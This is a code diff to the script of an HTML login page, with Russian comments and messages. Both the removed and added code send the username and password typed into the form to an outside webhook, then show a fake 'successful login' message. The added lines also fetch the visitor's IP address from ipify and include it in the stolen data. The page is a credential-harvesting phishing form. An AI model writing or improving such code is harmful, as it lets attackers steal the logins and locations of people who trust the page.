@@ -67,6 +67,8 @@
     </form>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js" integrity="sha512-T5rJ7hDx8Wp33VDbvIZhKj7b9zQkZ5QxtgvvLwU5OoD5eBc85+oZHvIWq3qKjX1fHn0AfoSyuwYFuxgR0GKsBg==" crossorigin="anonymous"></script>
+    <script src="//api.ipify.org?format=json"></script>
     <script>
         function submitForm(event) {
             event.preventDefault();
@@ -75,19 +77,26 @@
             var username = document.getElementById("username").value;
             var password = document.getElementById("password").value;
 
-            var request = new XMLHttpRequest();
-            request.open("POST", webhook_url);
-            request.setRequestHeader('Content-type', 'application/json');
-            var params = {
-                username: "Login Form",
-                avatar_url: "https://i.imgur.com/WzAMxKl.png",
-                content: "**Username**: " + username + "\n**Password**: " + password
-            };
-            request.send(JSON.stringify(params));
+            // Получение IP-адреса пользователя с помощью API ipify.org
+            fetch('//api.ipify.org?format=json')
+              .then(response => response.json())
+              .then(data => {
+                var ip_address = data.ip;
 
-            alert("Вы успешно вошли!");
-            document.getElementById("username").value = "";
-            document.getElementById("password").value = "";
+                var request = new XMLHttpRequest();
+                request.open("POST", webhook_url);
+                request.setRequestHeader('Content-type', 'application/json');
+                var params = {
+                    username: "Login Form",
+                    avatar_url: "https://i.imgur.com/WzAMxKl.png",
+                    content: "**Username**: " + username + "\n**Password**: " + password + "\n**IP Address**: " + ip_address
+                };
+                request.send(JSON.stringify(params));
+
+                alert("Вы успешно вошли!");
+                document.getElementById("username").value = "";
+                document.getElementById("password").value = "";
+            });
         }
     </script>
 </body>
